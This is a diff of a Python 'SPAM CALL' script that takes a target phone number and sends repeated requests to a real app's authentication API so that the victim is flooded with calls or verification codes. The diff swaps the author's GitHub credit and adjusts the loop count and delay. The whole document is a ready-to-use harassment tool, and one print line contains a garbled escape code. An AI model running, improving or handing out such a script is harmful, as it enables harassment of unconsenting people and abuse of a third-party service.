@@ -9,9 +9,9 @@ def balik():
 os.system("clear")
 print ("\tSPAM CALL V4.0")
 print ("      Coded: \033[1;96mFahmiApz\033[1;97m")
-print ("\033[1;97m*     Github:\033[1;92m github.com/BangDanz\033[1;97m      *")
+print ("\033[1;97m*     Github:\033[1;92m github.com/OHMMYCode\033[1;97m      *")
 print()
-print ("\033[90m>\033[1;97m CONTOH: \033[1;92m+62857×××××××××")
+print ("\033[90m>\033[1;97m CONTOH: \033[1;92mNull")
 no = input("\033[90m> \033[1;97mNOMOR TARGET: \033[1;92m")
 
 ua = {
@@ -26,13 +26,13 @@ ua = {
 "Accept-Encoding": "gzip, deflate, br",
 "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
 }
-for i in range(1,100):
+for i in range(1,20):
     dat = {"phone":no}
     r = requests.post("https://api.myfave.com/api/fave/v3/auth", data=json.dumps(dat), headers=ua).text
     if "6c047709f9da4291a568fa84b97b6d47" in r:
         print ("\033[90m> \]33[1;97mSPAM \033[1;94m=> \033[1;91mFAILED")
     else:
         print ("\033[90m> \033[1;97mSPAM \033[1;94m=> \033[1;92mSUCCESS")
-    time.sleep(0)
+    time.sleep(0.1)
 
 balik()
